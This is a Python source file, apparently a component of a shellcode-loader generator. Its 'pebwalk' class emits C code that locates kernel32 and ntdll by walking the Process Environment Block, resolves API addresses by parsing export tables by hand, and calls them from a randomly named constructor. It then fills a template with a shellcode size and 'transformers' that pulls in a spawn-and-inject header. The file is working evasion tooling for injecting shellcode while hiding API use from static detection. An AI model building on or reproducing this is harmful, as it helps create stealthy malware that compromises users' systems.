import random
import string
from c.utils.typedefs import typedefs

class pebwalk:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        self.typedefs = typedefs
        self.apicalls = {}

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        kernel32 = []
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw', 'Rt']:
                ntdll.append(apicall)
            else:
                kernel32.append(apicall)

        codeblock += """
PVOID LoadModulePeb( LPWSTR ModuleName )
{

    PPEB PPEB_PTR = (PPEB)__readgsqword( 0x60 );
    PLIST_ENTRY Module      = ( ( PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
    PLIST_ENTRY FirstModule = Module;

    WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
    WCHAR  PebModuleLower   [ MAX_PATH ]  = { 0 };

    // Zero a buffer to contain the lowercased module to find
    RtlSecureZeroMemory( SearchModuleLower, MAX_PATH );
    memcpy( SearchModuleLower, ModuleName, wcslen( ModuleName ) * 2 ); // wcslen returns char count, widestr == double  bytes
    CharLowerBuffW( SearchModuleLower, wcslen( ModuleName ) );
    do
    {
        // Zero a buffer and lowercase the found module name
        RtlSecureZeroMemory( PebModuleLower, MAX_PATH );
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
            Module, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        memcpy( PebModuleLower, mod->BaseDllName.Buffer, mod->BaseDllName.Length );
        CharLowerBuffW( PebModuleLower, mod->BaseDllName.Length );

        // If the lowercased strings match, return the address of the DLL
        if ( !( wcscmp( SearchModuleLower, PebModuleLower) ) ){
            return mod->DllBase;
        }
        Module = Module->Flink;
    } while ( Module && Module != FirstModule );

    return 0;
}


PVOID LoadFunction( PBYTE Module, LPSTR FunctionName )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    CHAR       LowerFoundName   [ MAX_PATH ] = { 0 };
    CHAR       LowerFunctionName[ MAX_PATH ] = { 0 };

    // Zero a buffer to contain the function to resolve, lowercased
    RtlSecureZeroMemory( LowerFunctionName, MAX_PATH );
    memcpy( LowerFunctionName, FunctionName, strlen( FunctionName ) );
    CharLowerBuffA( LowerFunctionName, strlen( FunctionName ) );

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    
    // Resolve absolute address of important export directory members
    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    // Walk through the number of names
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        // Zero a buffer to contain the found function, lowercased
        RtlSecureZeroMemory( LowerFoundName, MAX_PATH );
        FoundName = ( PCHAR ) Module + AddrOfNames[ I ]; // This gets the address of the function's name
        memcpy( LowerFoundName, FoundName, strlen( FoundName ) );
        CharLowerBuffA( LowerFoundName, strlen( FoundName ) );

        // Check if the lowercased strings match
        if ( !strcmp( LowerFoundName, LowerFunctionName ) )
        {
            // If they match, resolve the address of the function's code
            FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            if ( 
                (void *)FunctionAddr > (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress) && 
                (void *)FunctionAddr < (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[ 0 ].Size)
            ) // Forwarders are inside export table
            {
                // We can use getProcAddr to resolve forwarders
                // Manually is difficult -- we may run into apisets rather than simple [module].[export] strings
                return GetProcAddress( (HMODULE)Module, FoundName );
            }
            return FunctionAddr;
        }
    }
    return NULL;
}
"""

        codeblock += f"""

{'\n'.join([value for key,value in self.typedefs.items() if key in self.apicalls ])}

NTSTATUS status;

typedef struct {{
    {'\n\t'.join([f'{x}_t {x}_resolved;' for x in self.apicalls ])}
}} Resolver;

Resolver resolver;

void {self.name}(void) __attribute__((constructor));

void {self.name}(){{
"""
        if len(kernel32) > 0:
            codeblock += f"""
    PVOID kernelHandle = LoadModulePeb(L"kernel32.dll");
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(kernelHandle, "{x}");' for x in kernel32])};
"""

        if len(ntdll) > 0:
            codeblock += f"""
    PVOID ntdllHandle = LoadModulePeb(L"ntdll.dll");
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(ntdllHandle, "{x}");' for x in ntdll])};
"""

        codeblock += f"""
}}
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                self.apicalls[apicall] = f'status = resolver.{apicall}_resolved'
            else:
                self.apicalls[apicall] = f'resolver.{apicall}_resolved'